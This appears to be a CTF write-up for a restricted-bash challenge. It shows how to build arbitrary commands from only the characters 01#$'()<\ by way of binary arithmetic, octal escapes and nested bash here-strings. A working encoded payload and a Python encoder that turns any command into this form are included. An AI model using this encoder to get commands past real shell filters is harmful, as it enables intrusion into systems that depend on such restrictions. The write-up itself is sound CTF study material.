---
ai_date: '2025-04-27 05:21:25'
ai_summary: Exploited command injection using octal escape sequences and binary conversion
  to obtain numbers and characters in a restricted shell
ai_tags:
- cmd-inj
- octal-esc
- binary-conversion
created: 2024-08-03T16:18
points: 476
solves: 16
tags:
- bash
updated: 2024-08-05T19:35
---

## analysis
With some quick trial and error (trying all printable chars), we can obtain the valid charset this shell accepts.

```
01#$'()<\
```

That is very little indeed.

## step 1: numbers
Obviously at some point we need to obtain letters, and before that we need numbers.

A great candidate would be octal representation of characters `\000`.

How would we obtain numbers?

We can use `$((2#00010))` to convert from binary representation to decimal.

And we can obtain the 2 via `$((1<<1))`.

Putting them together we can now construct any number with `$(($((1<<1))#000101))`.

## step 2: characters

> Characters can be written as the octal form `\nnn` using numbers.

However, simply putting numbers together doesn't make them letters. 😢

The escape sequence `ls` can be written as `\\1$(($((1<<1))#101))$(($((1<<1))#100))\\1$(($((1<<1))#110))$(($((1<<1))#11))`.
But it would not run as `ls`.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1722717087/2024/08/3a67ead104579fdc188d6cae78bb9c98.png)

I got stuck on this for a long time (very long time), until I stumbled upon writeups for a past CTF challenge `minbashmaxfun`.

I can use `bash<<<\$\'\\1$(($((1<<1))#101))$(($((1<<1))#100))\\1$(($((1<<1))#110))$(($((1<<1))#11))\'` to run `ls`.

And since we are in bash, that would mean `$0<<<'...'`.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1722717507/2024/08/4173577f7e6a6375aed6d2a998c90c43.png)

## step 3: spaces

However, we still have another issue.

Using the above method we can indeed run any command, but arguments (and spaces) are interpreted as part of the command.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1722716940/2024/08/793bab89e87bd1830be75bb94b7f435d.png)

I, again, got stuck for quite a while until I stumbled upon another writeup for the same challenge `minbashmaxfun`.

The solution is simple, use another layer of `bash<<<`.

The final solution would be something like this.

```bash
bash<<<bash\<\<\<\$\'cat(smthhere)flag.txt\' # space here is in escape form
bash<<<$'cat flag.txt' # space becomes a space
cat flag.txt # profit
```

## solve script

The final payload is.

```bash
$0<<<$0\<\<\<\$\'\\1$(($((1<<1))#100))$(($((1<<1))#11))\\1$(($((1<<1))#100))1\\1$(($((1<<1))#110))$(($((1<<1))#100))\\0$(($((1<<1))#100))0\\1$(($((1<<1))#100))$(($((1<<1))#110))\\1$(($((1<<1))#101))$(($((1<<1))#100))\\1$(($((1<<1))#100))1\\1$(($((1<<1))#100))$(($((1<<1))#111))\\0$(($((1<<1))#101))$(($((1<<1))#110))\\1$(($((1<<1))#110))$(($((1<<1))#100))\\1$(($((1<<1))#111))0\\1$(($((1<<1))#110))$(($((1<<1))#100))\'
```

The translator is a python script I wrote.

```python
import string


def repl_nums(c):
    if c in '01':
        return c
    return f"$(($((1<<1))#{bin(int(c))[2:]}))"


def t(c):
    # if c not in "01#$'()<\\":
    return '\\\\'+''.join([repl_nums(_) for _ in oct(ord(c))[2:].zfill(3)])
    # return c

payload = "cat flag.txt"
payload = ''.join([t(c) for c in payload])
out = f"$0<<<$0\\<\\<\\<\\$\\'{payload}\\'"
print(out)
```

```flag
TFCCTF{fb1_0p3n_up!!!!__0x410x410x410x41}
```